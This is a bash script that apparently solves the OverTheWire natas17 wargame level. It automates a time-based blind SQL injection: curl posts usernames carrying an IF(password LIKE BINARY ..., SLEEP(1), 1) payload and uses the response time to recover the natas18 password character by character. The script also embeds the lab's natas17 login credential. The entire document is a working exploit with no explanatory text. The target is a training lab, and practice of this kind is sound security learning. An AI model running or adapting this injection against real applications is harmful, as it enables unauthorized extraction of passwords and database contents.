#!/bin/bash

# level located on natas17.natas.labs.overthewire.org

secretSymbols="________________________________"
password=""

while [ ${#secretSymbols} -ne 0 ]
do
	secretSymbols=${secretSymbols:1}
	symbolFound=false

	for symbol in {A..Z}
	do
		res=$({ time curl -s -u natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC http://natas17.natas.labs.overthewire.org?debug -d username="natas18\" AND IF (password LIKE BINARY \"${password}${symbol}${secretSymbols}\", SLEEP(1), 1) -- "; } 2>&1 | grep -e "^Executing" -e "real" | cut -c -144)
		if echo $res | grep "1\....s" > /dev/null
		then
			password="${password}${symbol}"
			echo "${password}${secretSymbols:1}"
			symbolFound=true
			break
		fi
	done

	if $symbolFound
	then
		continue
	fi

	for symbol in {a..z}
	do
		res=$({ time curl -s -u natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC http://natas17.natas.labs.overthewire.org?debug -d username="natas18\" AND IF (password LIKE BINARY \"${password}${symbol}${secretSymbols}\", SLEEP(1), 1) -- "; } 2>&1 | grep -e "^Executing" -e "real" | cut -c -144)
		if echo $res | grep "1\....s" > /dev/null
		then
			password="${password}${symbol}"
			echo "${password}${secretSymbols:1}"
			symbolFound=true
			break
		fi
	done

	if $symbolFound
	then
		continue
	fi

	for symbol in {0..9}
	do
		res=$({ time curl -s -u natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC http://natas17.natas.labs.overthewire.org?debug -d username="natas18\" AND IF (password LIKE BINARY \"${password}${symbol}${secretSymbols}\", SLEEP(1), 1) -- "; } 2>&1 | grep -e "^Executing" -e "real" | cut -c -144)
		if echo $res | grep "1\....s" > /dev/null
		then
			password="${password}${symbol}"
			echo "${password}${secretSymbols:1}"
			symbolFound=true
			break
		fi
	done
done

echo "The password is ${password}"

